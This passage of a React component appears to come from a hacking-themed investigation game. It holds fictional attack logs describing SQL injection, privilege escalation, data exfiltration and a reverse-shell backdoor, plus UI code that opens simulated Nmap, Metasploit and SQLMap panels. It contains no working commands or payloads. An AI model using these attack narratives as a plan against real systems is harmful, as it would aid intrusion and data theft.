          after: 'Data exfiltration completed. 1.2 TB of sensitive financial data transferred to Chaos Network servers. Backdoor established for persistent access. ChaosMaster cleaned all logs and removed evidence. Attack concluded successfully. Data now being prepared for sale on dark web marketplace. Corporate system remains compromised. Security team still investigating network issues but unaware of full extent of breach.',
          timeAgo: '44 hours 15 minutes ago'
        }
      ];
    } else if (isProfessional) {
      // Shadow Network attack logs
      logEntries = [
        { 
          timestamp: new Date(attackStartTime.getTime() + 0).toISOString(),
          event: 'INITIAL_RECONNAISSANCE',
          severity: 'HIGH',
          source: '198.51.100.42',
          before: 'System was operating normally. All security checks passed. No suspicious activity detected. Network traffic was within normal parameters.',
          after: 'Attacker performed port scanning and service enumeration. Identified vulnerable SQL database endpoint on port 3306. Discovered web application login form with insufficient input validation. Began mapping network infrastructure.',
          timeAgo: '48 hours ago'
        },
        { 
          timestamp: new Date(attackStartTime.getTime() + 5 * 60 * 1000).toISOString(),
          event: 'SQL_INJECTION_ATTEMPT',
          severity: 'HIGH',
          source: '198.51.100.42',
          before: 'Database was accessible via web application login form. Input validation was insufficient. Login attempts were being logged but not flagged as suspicious.',
          after: 'SQL injection successful. Attacker gained access to database schema and table structures. Began extracting table names and column information. Discovered employee_records, infrastructure_blueprints, and communication_logs tables.',
          timeAgo: '47 hours 55 minutes ago'
        },
        { 
          timestamp: new Date(attackStartTime.getTime() + 7 * 60 * 1000).toISOString(),
          event: 'PRIVILEGE_ESCALATION',
          severity: 'CRITICAL',
          source: '198.51.100.42',
          before: 'Attacker had limited database read access. Could only query non-sensitive tables. System logs showed normal database operations.',
          after: 'Attacker exploited database vulnerability (CVE-2024-XXXXX) to escalate privileges to root. Now has full database administrator access. Can read, write, and modify all data. Security monitoring systems failed to detect privilege escalation.',
          timeAgo: '47 hours 53 minutes ago'
        },
        { 
          timestamp: new Date(attackStartTime.getTime() + 10 * 60 * 1000).toISOString(),
          event: 'DATA_EXFILTRATION_START',
          severity: 'CRITICAL',
          source: '198.51.100.42',
          before: 'Sensitive data was stored in encrypted format. Access logs showed no unauthorized data access. Network bandwidth usage was normal.',
          after: 'Attacker began bulk extraction of employee records, infrastructure blueprints, and communication logs. Data being compressed and transferred to external server at 198.51.100.43. Transfer rate: ~5.8 GB/min. Network traffic spike detected but not investigated immediately.',
          timeAgo: '47 hours 50 minutes ago'
        },
        { 
          timestamp: new Date(attackStartTime.getTime() + 2 * 60 * 60 * 1000 + 20 * 60 * 1000).toISOString(),
          event: 'BACKDOOR_INSTALLED',
          severity: 'CRITICAL',
          source: '198.51.100.42',
          before: 'System had no persistent unauthorized access mechanisms. All connections required authentication. No suspicious processes running.',
          after: 'Attacker installed custom backdoor script (backdoor.sh) in /opt/system/.hidden/. Backdoor creates reverse shell connection every 5 minutes to 198.51.100.42. Allows persistent access even after initial breach is closed. Process hidden from standard monitoring tools.',
          timeAgo: '45 hours 40 minutes ago'
        },
        { 
          timestamp: new Date(attackStartTime.getTime() + 2 * 60 * 60 * 1000 + 34 * 60 * 1000 + 12 * 1000).toISOString(),
          event: 'ATTACK_COMPLETE',
          severity: 'CRITICAL',
          source: '198.51.100.42',
          before: 'Attack was in progress. Security team was unaware of the breach. System appeared to be functioning normally from user perspective.',
          after: 'Data exfiltration completed. 847.3 GB of sensitive data transferred to 198.51.100.43. Backdoor established for persistent access. Attacker cleaned logs to remove evidence of attack. Attack concluded successfully from attacker perspective. System remains compromised with persistent access. Security team still unaware of breach.',
          timeAgo: '45 hours 26 minutes ago'
        }
      ];
    } else {
      // Default logs
      logEntries = [
        { 
          timestamp: new Date(attackStartTime.getTime() + 0).toISOString(),
          event: 'INITIAL_RECONNAISSANCE',
          severity: 'HIGH',
          source: '192.168.1.100',
          before: 'System was operating normally.',
          after: 'Attacker performed reconnaissance and identified vulnerabilities.',
          timeAgo: '48 hours ago'
        }
      ];
    }
    
    // Generate story-specific file hashes
    let fileHashes;
    if (isDelusional) {
      fileHashes = [
        { hash: 'c7a9f3e1b5d8c2f4a6e9b1d3c5f7a2e4b6d8c1f3a5e7b9d2c4f6a8e1b3d5', filename: 'chaos_rat.exe', size: '3.8 MB' },
        { hash: 'd8b2f4e6a9c1d3f5b7e2a4c6d8f1b3e5a7c9d2f4b6e8a1c3d5f7b9e2', filename: 'financial_data_package.zip', size: '1.2 TB' },
        { hash: 'e9c3f5a7b2d4e6f8c1a3b5d7e9f2c4a6b8d1e3f5c7a9b2d4e6f8c1a3', filename: 'chaos_backdoor.dll', size: '892 KB' }
      ];
    } else if (isProfessional) {
      fileHashes = [
        { hash: 'a3f5d8e2b1c9f4a7e6d5c8b2a1f9e4d7c6b5a8f3e2d1c9b8a7f6e5d4c3b2a1f0', filename: 'exploit_payload.bin', size: '2.4 MB' },
        { hash: 'b4e6f9a3c2d8e1f5a7b9c3d6e8f2a4b6c8d1e3f5a7b9c2d4e6f8a1b3c5d7e9', filename: 'backdoor.sh', size: '156 KB' },
        { hash: 'c5f7a1b4d3e9f2a6b8c1d4e7f9a2b5c8d1e4f7a9b2c5d8e1f4a7b9c2d5e8', filename: 'data_exfil.zip', size: '847.3 GB' }
      ];
    } else {
      fileHashes = [
        { hash: 'a1b2c3d4e5f6a7b8c9d1e2f3a4b5c6d7e8f9a1b2c3d4e5f6a7b8c9d1', filename: 'attack_payload.bin', size: '1.5 MB' }
      ];
    }
    
    return {
      ...baseData,
      logEntries,
      fileHashes
    };
  };

  const handleGetStarted = () => {
    setShowInvestigation(false);
    setCurrentStepIndex(0);
  };

  const handleNextStep = () => {
    if (currentStepIndex < steps.length - 1) {
      setCurrentStepIndex(currentStepIndex + 1);
    }
  };

  const handlePrevStep = () => {
    if (currentStepIndex > 0) {
      setCurrentStepIndex(currentStepIndex - 1);
    }
  };

  return (
    <InvestigationContainer
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      onClick={(e) => e.target === e.currentTarget && onClose()}
    >
      <LaptopFrame
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        exit={{ scale: 0.9, opacity: 0 }}
        onClick={(e) => e.stopPropagation()}
      >
        <LaptopScreen>
          <ScreenHeader>
            <ScreenTitle>
              <FaLaptop />
              {analysisData?.storyTitle || 'Investigation Terminal'}
            </ScreenTitle>
            <CloseButton onClick={onClose}>
              <FaTimes />
            </CloseButton>
          </ScreenHeader>

          <ScreenContent $hasTool={showToolPanel && selectedTool}>
            <AnimatePresence mode="wait">
              {showInvestigation ? (
                <motion.div
                  key="investigation"
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -20 }}
                >
                  <h2 style={{ color: '#00ff41', fontFamily: "'Orbitron', sans-serif", marginBottom: '10px' }}>
                    {character?.personality === 'delusional' && story?.job === 'criminal_empire' 
                      ? `Operation: ${analysisData?.caseName || 'Criminal Operation'}` 
                      : `Case: ${analysisData?.caseName || 'Cyber Attack Investigation'}`}
                  </h2>
                  <p style={{ color: '#888', marginBottom: '30px' }}>
                    {character?.personality === 'delusional' && story?.job === 'criminal_empire' 
                      ? 'Operation Dashboard - Attack Planning & Execution' 
                      : 'Investigation Dashboard - Initial Compromise Analysis'}
                  </p>

                  <InvestigationDashboard>
                    <DashboardCard>
                      <CardTitle>
                        <FaClock />
                        Attack Timeline
                      </CardTitle>
                      <DataList>
                        <DataItem>
                          <DataLabel>Initial Breach:</DataLabel>
                          <DataValue>{analysisData?.attackTimestamp || '2024-01-15 14:23:45 UTC'}</DataValue>
                        </DataItem>
                        <DataItem>
                          <DataLabel>Duration:</DataLabel>
                          <DataValue>{analysisData?.attackDuration || '2h 34m 12s'}</DataValue>
                        </DataItem>
                        <DataItem>
                          <DataLabel>Status:</DataLabel>
                          <DataValue>ACTIVE THREAT</DataValue>
                          <CriticalBadge>CRITICAL</CriticalBadge>
                        </DataItem>
                      </DataList>
                    </DashboardCard>

                    <DashboardCard>
                      <CardTitle>
                        <FaNetworkWired />
                        Source Intelligence
                      </CardTitle>
                      <DataList>
                        <DataItem>
                          <DataLabel>Primary IP:</DataLabel>
                          <DataValue>{analysisData?.sourceIP || '198.51.100.42'}</DataValue>
                        </DataItem>
                        <DataItem>
                          <DataLabel>Attack Vector:</DataLabel>
                          <DataValue>{analysisData?.attackVector || 'Zero-day CVE-2024-XXXXX'}</DataValue>
                        </DataItem>
                        <DataItem>
                          <DataLabel>Threat Actor:</DataLabel>
                          <DataValue>{analysisData?.organizationName || 'Unknown'}</DataValue>
                          <AlertBadge>KNOWN GROUP</AlertBadge>
                        </DataItem>
                      </DataList>
                    </DashboardCard>

                    <DashboardCard>
                      <CardTitle>
                        <FaDatabase />
                        Data Compromise
                      </CardTitle>
                      <DataList>
                        <DataItem>
                          <DataLabel>Data Exfiltrated:</DataLabel>
                          <DataValue>{analysisData?.dataExfiltrated || '847.3 GB'}</DataValue>
                        </DataItem>
                        <DataItem>
                          <DataLabel>Records Affected:</DataLabel>
                          <DataValue>{analysisData?.affectedRecords || '2,847,392'}</DataValue>
                        </DataItem>
                        <DataItem>
                          <DataLabel>Target System:</DataLabel>
                          <DataValue>{analysisData?.targetSystem || 'gov-db-primary-01'}</DataValue>
                        </DataItem>
                      </DataList>
                    </DashboardCard>

                    <DashboardCard>
                      <CardTitle>
                        <FaShieldAlt />
                        Compromised Accounts
                      </CardTitle>
                      <DataList>
                        {analysisData?.compromisedAccounts?.map((account, idx) => (
                          <DataItem key={idx}>
                            <DataLabel>Account {idx + 1}:</DataLabel>
                            <DataValue>{account}</DataValue>
                            <CriticalBadge>COMPROMISED</CriticalBadge>
                          </DataItem>
                        ))}
                      </DataList>
                    </DashboardCard>
                  </InvestigationDashboard>

                  {analysisData && analysisData.logEntries && 
                   !(character?.personality === 'delusional' && story?.job === 'criminal_empire') && (
                    <ViewLogsButton
                      onClick={() => setShowLogsModal(true)}
                      whileHover={{ scale: 1.05 }}
                      whileTap={{ scale: 0.95 }}
                    >
                      <FaFileAlt />
                      View Attack Logs
                    </ViewLogsButton>
                  )}

                  <GetStartedButton
                    onClick={handleGetStarted}
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                  >
                    <FaPlay />
                    {character?.personality === 'delusional' && story?.job === 'criminal_empire' 
                      ? 'Begin Operation' 
                      : 'Begin Investigation'}
                  </GetStartedButton>
                </motion.div>
              ) : (
                <StepsPanel>
                    <motion.div
                      key="steps"
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -20 }}
                    >
                      {currentStep && (
                        <StepContainer>
                          <StepHeader>
                            <StepNumber>{currentStepIndex + 1}</StepNumber>
                            <StepTitle>{currentStep.title}</StepTitle>
                            <StepNavigation>
                              <NavButton onClick={handlePrevStep} disabled={currentStepIndex === 0}>
                                <FaChevronLeft />
                                Previous
                              </NavButton>
                              <NavButton onClick={handleNextStep} disabled={currentStepIndex === steps.length - 1}>
                                Next
                                <FaChevronRight />
                              </NavButton>
                            </StepNavigation>
                          </StepHeader>

                          <StepContent>
                            <AnalysisSection>
                              <AnalysisTitle>Investigation Analysis</AnalysisTitle>
                              <AnalysisText>{currentStep.description}</AnalysisText>
                            </AnalysisSection>

                            {currentStep.instructions && (() => {
                              // Parse instructions into sub-steps
                              const parseInstructions = () => {
                                const subSteps = [];
                                let currentSubStep = null;
                                
                                currentStep.instructions.forEach((instruction, idx) => {
                                  if (instruction.startsWith('STEP') || instruction.match(/^STEP \d+/)) {
                                    // Start a new sub-step
                                    if (currentSubStep) {
                                      subSteps.push(currentSubStep);
                                    }
                                    currentSubStep = {
                                      title: instruction,
                                      content: [],
                                      stepNumber: instruction.match(/STEP (\d+)/)?.[1] || subSteps.length + 1
                                    };
                                  } else if (currentSubStep) {
                                    currentSubStep.content.push(instruction);
                                  }
                                });
                                
                                if (currentSubStep) {
                                  subSteps.push(currentSubStep);
                                }
                                
                                return subSteps;
                              };
                              
                              const subSteps = parseInstructions();
                              
                              // Map sub-steps to tools and actions (based on keywords in instructions)
                              const getToolForSubStep = (subStep) => {
                                const allContent = subStep.content.join(' ').toLowerCase();
                                const chapterId = story?.currentChapter || chapter?.id || 1;
                                const stepId = currentStep.id;
                                
                                console.log('Checking sub-step for tool:', subStep.title, 'Content:', allContent.substring(0, 100));
                                
                                // Check if this sub-step mentions specific tools
                                if (allContent.includes('nmap') || allContent.includes('scan')) {
                                  console.log('Found Nmap tool requirement');
                                  return { id: 'nmap', name: 'Nmap', icon: FaNetworkWired, type: 'tool' };
                                }
                                if (allContent.includes('wireshark') || allContent.includes('packet')) {
                                  return { id: 'wireshark', name: 'Wireshark', icon: FaEye, type: 'tool' };
                                }
                                if (allContent.includes('metasploit') || allContent.includes('exploit')) {
                                  return { id: 'metasploit', name: 'Metasploit', icon: FaBomb, type: 'tool' };
                                }
                                if (allContent.includes('sqlmap') || allContent.includes('sql injection')) {
                                  return { id: 'sqlmap', name: 'SQLMap', icon: FaDatabase, type: 'tool' };
                                }
                                if (allContent.includes('osint') || allContent.includes('recon-ng')) {
                                  return { id: 'osint', name: 'OSINT', icon: FaSearch, type: 'tool' };
                                }
                                
                                // Check for actions
                                if (allContent.includes('navigate to companies') || allContent.includes('go to companies') || allContent.includes('companies page')) {
                                  return { 
                                    id: 'navigate_companies', 
                                    name: 'Go to Companies Page', 
                                    icon: FaBuilding, 
                                    type: 'action',
                                    action: {
                                      id: 'navigate_companies',
                                      label: 'Go to Companies Page',
                                      type: 'navigation',
                                      route: '/companies',
                                      guidance: 'Navigate to the Companies page to view available targets. Look for the "Government Database" company and click "View Attack Details" to proceed with the investigation.'
                                    }
                                  };
                                }
                                if (allContent.includes('navigate to phone') || allContent.includes('go to phone') || allContent.includes('use phone')) {
                                  return { 
                                    id: 'navigate_phone', 
                                    name: 'Go to Phone', 
                                    icon: FaPhone, 
                                    type: 'action',
                                    action: {
                                      id: 'navigate_phone',
                                      label: 'Go to Phone',
                                      type: 'navigation',
                                      route: '/phone',
                                      guidance: 'Navigate to the Phone page to access phone features and tools needed for this step.'
                                    }
                                  };
                                }
                                if (allContent.includes('navigate to env') || allContent.includes('go to env') || allContent.includes('open environment')) {
                                  return { 
                                    id: 'navigate_env', 
                                    name: 'Go to Environment Tools', 
                                    icon: FaNetworkWired, 
                                    type: 'action',
                                    action: {
                                      id: 'navigate_env',
                                      label: 'Go to Environment Tools',
                                      type: 'navigation',
                                      route: '/env',
                                      guidance: 'Navigate to the Environment page to access hacking tools like Wireshark, Nmap, and Metasploit.'
                                    }
                                  };
                                }
                                
                                // Fallback to step's main tool
                                const stepTools = getToolsForStep(stepId, chapterId);
                                if (stepTools.length > 0) {
                                  return { ...stepTools[0], type: 'tool' };
                                }
                                return null;
                              };
                              
                              return (
                                <div>
                                  {subSteps.map((subStep, subIdx) => {
                                    const resource = getToolForSubStep(subStep);
                                    return (
                                      <div key={subIdx} style={{ marginBottom: '30px' }}>
                                        <InstructionDetail>
                                          <div style={{ marginBottom: '15px', color: '#00ff41', fontWeight: 'bold', fontSize: '1rem' }}>
                                            {subStep.title}
                                          </div>
                                          {subStep.content.map((line, lineIdx) => {
                                            if (line.startsWith('  •') || line.startsWith('  -')) {
                                              return (
                                                <div key={lineIdx} style={{ marginBottom: '8px', color: '#00ffff', paddingLeft: '15px', lineHeight: '1.8' }}>
                                                  {line.trim()}
                                                </div>
                                              );
                                            } else if (line.trim() === '') {
                                              return <br key={lineIdx} />;
                                            } else if (line.toLowerCase().includes('tip:') || line.toLowerCase().includes('note:')) {
                                              return (
                                                <div key={lineIdx} style={{ marginTop: '15px', marginBottom: '10px', padding: '10px', background: 'rgba(255, 170, 0, 0.1)', border: '1px solid #ffaa00', borderRadius: '5px', color: '#ffaa00' }}>
                                                  💡 {line}
                                                </div>
                                              );
                                            } else {
                                              return (
                                                <div key={lineIdx} style={{ marginBottom: '8px', color: '#ccc', paddingLeft: '10px', lineHeight: '1.6' }}>
                                                  {line}
                                                </div>
                                              );
                                            }
                                          })}
                                        </InstructionDetail>
                                        
                                        {resource && (
                                          <div style={{ marginTop: '15px', marginBottom: '20px' }}>
                                            {resource.type === 'action' ? (
                                              // Show action button
                                              <div style={{ 
                                                padding: '15px', 
                                                background: 'rgba(0, 255, 65, 0.1)', 
                                                border: '2px solid #00ff41', 
                                                borderRadius: '8px'
                                              }}>
                                                <div style={{ color: '#00ff41', fontSize: '0.9rem', fontWeight: 'bold', fontFamily: "'Orbitron', sans-serif", marginBottom: '10px' }}>
                                                  Action Required:
                                                </div>
                                                <ActionButton
                                                  completed={completedActions.has(resource.id)}
                                                  onClick={() => handleAction(resource.action)}
                                                  whileHover={{ scale: 1.02 }}
                                                  whileTap={{ scale: 0.98 }}
                                                >
                                                  {completedActions.has(resource.id) ? <FaCheckCircle /> : <FaPlay />}
                                                  {resource.name}
                                                  {completedActions.has(resource.id) && <span style={{ marginLeft: 'auto', color: '#00ff41' }}>✓ Done</span>}
                                                </ActionButton>
                                                {resource.action.guidance && (
                                                  <GuidanceText style={{ marginTop: '10px' }}>
                                                    <strong>How to do this:</strong><br />
                                                    {resource.action.guidance}
                                                  </GuidanceText>
                                                )}
                                              </div>
                                            ) : (
                                              // Show tool button with lab instructions
                                              <div>
                                                <div style={{ 
                                                  padding: '15px', 
                                                  background: 'rgba(0, 255, 65, 0.1)', 
                                                  border: '2px solid #00ff41', 
                                                  borderRadius: '8px',
                                                  display: 'flex',
                                                  alignItems: 'center',
                                                  gap: '15px',
                                                  marginBottom: '15px'
                                                }}>
                                                  <div style={{ color: '#00ff41', fontSize: '0.9rem', fontWeight: 'bold', fontFamily: "'Orbitron', sans-serif" }}>
                                                    Tool Required:
                                                  </div>
                                                  <ToolButton
                                                    active={selectedTool?.id === resource.id && selectedTool?.stepId === currentStep.id}
                                                    onClick={() => {
                                                      console.log('Tool button clicked:', resource.id, 'for step:', currentStep.id);
                                                      const newSelectedTool = { id: resource.id, name: resource.name, stepId: currentStep.id };
                                                      setSelectedTool(newSelectedTool);
                                                      setShowToolPanel(true);
                                                      // Initialize lab instructions immediately if not exists
                                                      const key = `${resource.id}_${currentStep.id}`;
                                                      if (!toolInstructions[key]) {
                                                        const labSteps = getLabInstructions(resource.id, currentStep.id, subStep.content);
                                                        console.log('Initializing lab instructions:', key, labSteps.length, 'steps');
                                                        setToolInstructions(prev => ({
                                                          ...prev,
                                                          [key]: {
                                                            completedSteps: new Set(),
                                                            allSteps: labSteps
                                                          }
                                                        }));
                                                      }
                                                      // Don't open modal immediately - let user see lab instructions first
                                                    }}
                                                    whileHover={{ scale: 1.05 }}
                                                    whileTap={{ scale: 0.95}}
                                                    style={{ 
                                                      padding: '10px 20px',
                                                      display: 'flex',
                                                      alignItems: 'center',
                                                      gap: '10px',
                                                      fontSize: '0.9rem'
                                                    }}
                                                  >
                                                    {React.createElement(resource.icon, { style: { fontSize: '1.5rem' } })}
                                                    <span>{resource.name}</span>
                                                  </ToolButton>
                                                </div>
                                                
                                                {(() => {
                                                  const key = `${resource.id}_${currentStep.id}`;
                                                  const labData = toolInstructions[key];
                                                  
                                                  // Show lab instructions if tool is selected
                                                  const shouldShow = selectedTool?.id === resource.id && selectedTool?.stepId === currentStep.id;
                                                  
                                                  console.log('Lab instructions check:', {
                                                    shouldShow,
                                                    selectedToolId: selectedTool?.id,
                                                    resourceId: resource.id,
                                                    selectedToolStepId: selectedTool?.stepId,
                                                    currentStepId: currentStep.id,
                                                    hasLabData: !!labData
                                                  });
                                                  
                                                  if (!shouldShow) return null;
                                                  
                                                  // Get or generate lab steps
                                                  const labSteps = labData?.allSteps || getLabInstructions(resource.id, currentStep.id, subStep.content);
                                                  const completedSteps = labData?.completedSteps || new Set();
                                                  const allComplete = labSteps.length > 0 && labSteps.every(step => completedSteps.has(step.number));
                                                  
                                                  console.log('Rendering lab instructions:', labSteps.length, 'steps');
                                                  
                                                  return (
                                                    <LabInstructionPanel>
                                                      <LabHeader>
                                                        <LabTitle>
                                                          <FaTools />
                                                          Detailed Lab Instructions: {resource.name}
                                                        </LabTitle>
                                                        <CompletionBadge $completed={allComplete}>
                                                          {allComplete ? '✓ All Complete' : `${completedSteps.size}/${labSteps.length} Steps`}
                                                        </CompletionBadge>
                                                      </LabHeader>
                                                      
                                                      {labSteps.map((step) => {
                                                        const isCompleted = completedSteps.has(step.number);
                                                        return (
                                                          <LabStep key={step.number} $completed={isCompleted}>
                                                            <LabStepHeader>
                                                              <LabStepCheckbox
                                                                $completed={isCompleted}
                                                                onClick={() => toggleLabStep(resource.id, currentStep.id, step.number)}
                                                              >
                                                                {isCompleted ? '✓' : ''}
                                                              </LabStepCheckbox>
                                                              <LabStepNumber>Step {step.number}:</LabStepNumber>
                                                              <LabStepTitle $completed={isCompleted}>
                                                                {step.title}
                                                              </LabStepTitle>
                                                            </LabStepHeader>
                                                            <LabStepContent>
                                                              <div style={{ marginBottom: '10px' }}>{step.description}</div>
                                                              {step.command && (
                                                                <LabStepCommand>
                                                                  {step.command.split('\n').map((line, idx) => (
                                                                    <div key={idx}>{line}</div>
                                                                  ))}
                                                                </LabStepCommand>
                                                              )}
                                                              {step.details && step.details.length > 0 && (
                                                                <div style={{ marginTop: '10px' }}>
                                                                  {step.details.map((detail, idx) => (
                                                                    <div key={idx} style={{ marginLeft: '20px', marginBottom: '5px', color: '#888' }}>
                                                                      • {detail}
                                                                    </div>
                                                                  ))}
                                                                </div>
                                                              )}
                                                            </LabStepContent>
                                                          </LabStep>
                                                        );
                                                      })}
                                                      
                                                      {allComplete && (
                                                        <AllCompleteMessage>
                                                          🎉 All Steps Completed! You can now proceed to the next phase.
                                                        </AllCompleteMessage>
                                                      )}
                                                      
                                                      <div style={{ marginTop: '20px', display: 'flex', gap: '10px' }}>
                                                        <ToolButton
                                                          active={false}
                                                          onClick={() => {
                                                            // Navigate to dedicated tool lab page
                                                            const labSteps = getLabInstructions(resource.id, currentStep.id, subStep.content);
                                                            navigate('/tool-lab', {
                                                              state: {
                                                                tool: { id: resource.id, name: resource.name },
                                                                step: currentStep,
                                                                selectedCompany: selectedCompany,
                                                                labInstructions: labSteps
                                                              }
                                                            });
                                                          }}
                                                          whileHover={{ scale: 1.05 }}
                                                          whileTap={{ scale: 0.95}}
                                                          style={{ 
                                                            padding: '12px 24px',
                                                            display: 'flex',
                                                            alignItems: 'center',
                                                            gap: '10px',
                                                            fontSize: '1rem',
                                                            background: 'rgba(0, 255, 65, 0.2)',
                                                            border: '2px solid #00ff41'
                                                          }}
                                                        >
                                                          {React.createElement(resource.icon, { style: { fontSize: '1.5rem' } })}
                                                          <span>Open {resource.name} Tool</span>
                                                        </ToolButton>
                                                      </div>
                                                    </LabInstructionPanel>
                                                  );
                                                })()}
                                              </div>
                                            )}
                                          </div>
                                        )}
                                      </div>
                                    );
                                  })}
                                </div>
                              );
                            })()}

                            {currentStepIndex === 1 && analysisData && (
                              <EvidenceGrid>
                                <EvidenceCard>
                                  <EvidenceTitle>Network Nodes Discovered</EvidenceTitle>
                                  {analysisData.networkNodes?.slice(0, 3).map((node, idx) => (
                                    <EvidenceValue key={idx}>
                                      {node.ip} ({node.hostname}) - {node.status}
                                    </EvidenceValue>
                                  ))}
                                </EvidenceCard>
                                <EvidenceCard>
                                  <EvidenceTitle>Security Log Entries</EvidenceTitle>
                                  {analysisData.logEntries?.slice(0, 3).map((log, idx) => (
                                    <EvidenceValue key={idx}>
                                      [{log.timestamp}] {log.event} - {log.severity}
                                    </EvidenceValue>
                                  ))}
                                </EvidenceCard>
                              </EvidenceGrid>
                            )}

                            {currentStep.objectives && (
                              <AnalysisSection>
                                <AnalysisTitle>Current Objectives</AnalysisTitle>
                                <ul style={{ listStyle: 'none', padding: 0 }}>
                                  {currentStep.objectives.map((obj, idx) => (
                                    <li key={idx} style={{ marginBottom: '8px', color: '#00ffff', paddingLeft: '20px', position: 'relative' }}>
                                      <span style={{ position: 'absolute', left: 0, color: '#00ff41' }}>▸</span>
                                      {obj}
                                    </li>
                                  ))}
                                </ul>
                              </AnalysisSection>
                            )}

                            
                          </StepContent>
                        </StepContainer>
                      )}
                    </motion.div>
                </StepsPanel>
              )}
            </AnimatePresence>
            
            {showToolPanel && selectedTool && (
              <ToolPanel>
                <ToolPanelHeader>
                  <ToolPanelTitle>
                    {React.createElement(
                      selectedTool.id === 'nmap' ? FaNetworkWired :
                      selectedTool.id === 'wireshark' ? FaEye :
                      selectedTool.id === 'metasploit' ? FaBomb :
                      selectedTool.id === 'sqlmap' ? FaDatabase :
                      selectedTool.id === 'osint' ? FaSearch : FaTools,
                      { style: { fontSize: '1.5rem' } }
                    )}
                    {selectedTool.name}
                  </ToolPanelTitle>
                  <ToolCloseButton onClick={() => setShowToolPanel(false)}>
                    <FaTimes />
                    Close
                  </ToolCloseButton>
                </ToolPanelHeader>
                
                <div style={{ flex: 1, overflow: 'auto' }}>
                  {selectedTool.id === 'wireshark' && (
                    <WiresharkInterface 
                      tool={{ id: 'wireshark', name: 'Wireshark' }}
                      embedded={true}
                      onClose={() => {
                        const stepId = selectedTool.stepId;
                        const toolId = selectedTool.id;
                        setShowToolPanel(false);
                        setUsedTools(prev => new Set([...prev, `${stepId}-${toolId}`]));
                      }}
                    />
                  )}
                  {selectedTool.id === 'nmap' && (
                    <NmapInterface 
                      tool={{ id: 'nmap', name: 'Nmap' }}
                      targets={analysisData?.networkNodes?.map((node, idx) => ({ id: `node-${idx}-${node.ip}`, ip: node.ip, name: node.hostname })) || []}
                      stepContext={currentStep}
                      selectedCompany={selectedCompany}
                      embedded={true}
                      onClose={() => {
                        const stepId = selectedTool.stepId;
                        const toolId = selectedTool.id;
                        setShowToolPanel(false);
                        setUsedTools(prev => new Set([...prev, `${stepId}-${toolId}`]));
                      }}
                    />
                  )}
                  {selectedTool.id === 'metasploit' && (
                    <MetasploitInterface 
                      tool={{ id: 'metasploit', name: 'Metasploit' }}
                      targets={analysisData?.networkNodes?.map(node => ({ ip: node.ip, name: node.hostname })) || []}
                      embedded={true}
                      onClose={() => {
                        const stepId = selectedTool.stepId;
                        const toolId = selectedTool.id;
                        setShowToolPanel(false);
                        setUsedTools(prev => new Set([...prev, `${stepId}-${toolId}`]));
                      }}
                    />
                  )}
                  {selectedTool.id === 'sqlmap' && (
                    <SqlmapInterface 
                      tool={{ id: 'sqlmap', name: 'SQLMap' }}
                      targets={analysisData?.networkNodes?.map(node => ({ ip: node.ip, name: node.hostname })) || []}
                      embedded={true}
                      onClose={() => {
                        const stepId = selectedTool.stepId;
                        const toolId = selectedTool.id;
                        setShowToolPanel(false);
                        setUsedTools(prev => new Set([...prev, `${stepId}-${toolId}`]));
                      }}
                    />
                  )}
                  {selectedTool.id === 'osint' && (
                    <OsintInterface 
                      tool={{ id: 'osint', name: 'OSINT' }}
                      targets={analysisData?.networkNodes?.map(node => ({ ip: node.ip, name: node.hostname })) || []}
                      embedded={true}
                      onClose={() => {
                        const stepId = selectedTool.stepId;
                        const toolId = selectedTool.id;
                        setShowToolPanel(false);
                        setUsedTools(prev => new Set([...prev, `${stepId}-${toolId}`]));
                      }}
                    />
                  )}
                </div>
              </ToolPanel>
            )}
          </ScreenContent>
        </LaptopScreen>
      </LaptopFrame>

      <AnimatePresence>
        {showLogsModal && analysisData && (
          <LogsModal
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={(e) => e.target === e.currentTarget && setShowLogsModal(false)}
          >
            <LogsModalContent
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
            >
              <LogsModalHeader>
                <LogsModalTitle>
                  <FaFileAlt />
                  Complete Attack Logs - 48 Hours Ago
                </LogsModalTitle>
                <CloseButton onClick={() => setShowLogsModal(false)}>
                  <FaTimes />
                </CloseButton>
              </LogsModalHeader>

              <div style={{ marginBottom: '20px', color: '#888', fontSize: '0.9rem', fontFamily: "'Share Tech Mono', monospace" }}>
                Attack Timeline: {new Date(analysisData.attackTimestamp).toLocaleString()} - Duration: {analysisData.attackDuration}
              </div>

              {analysisData.logEntries.map((log, idx) => (
                <DetailedLogEntry key={idx} severity={log.severity}>
                  <LogTimeInfo>
                    {log.timeAgo || new Date(log.timestamp).toLocaleString()} • {new Date(log.timestamp).toLocaleString()}
                  </LogTimeInfo>
                  
                  <LogEventHeader>
                    <LogEventName>{log.event.replace(/_/g, ' ')}</LogEventName>
                    <LogSeverityBadge severity={log.severity}>{log.severity}</LogSeverityBadge>
                  </LogEventHeader>

                  {log.before && (
                    <LogContext>
                      <ContextLabel>Before Event:</ContextLabel>
                      <ContextText>{log.before}</ContextText>
                    </LogContext>
                  )}

                  {log.after && (
                    <LogContext>
                      <ContextLabel>After Event:</ContextLabel>
                      <ContextText>{log.after}</ContextText>
                    </LogContext>
                  )}

                  <LogSourceIP>
                    Source IP: {log.source}
                  </LogSourceIP>
                </DetailedLogEntry>
              ))}
            </LogsModalContent>
          </LogsModal>
        )}
      </AnimatePresence>

      {/* Companies Modal */}
      <AnimatePresence>
        {showCompaniesModal && (
          <CompaniesModal
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={(e) => e.target === e.currentTarget && setShowCompaniesModal(false)}
          >
            <CompaniesModalContent
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
            >
              <CompaniesModalHeader>
                <CompaniesModalTitle>
                  <FaBuilding />
                  Available Companies
                </CompaniesModalTitle>
                <CloseButton onClick={() => setShowCompaniesModal(false)}>
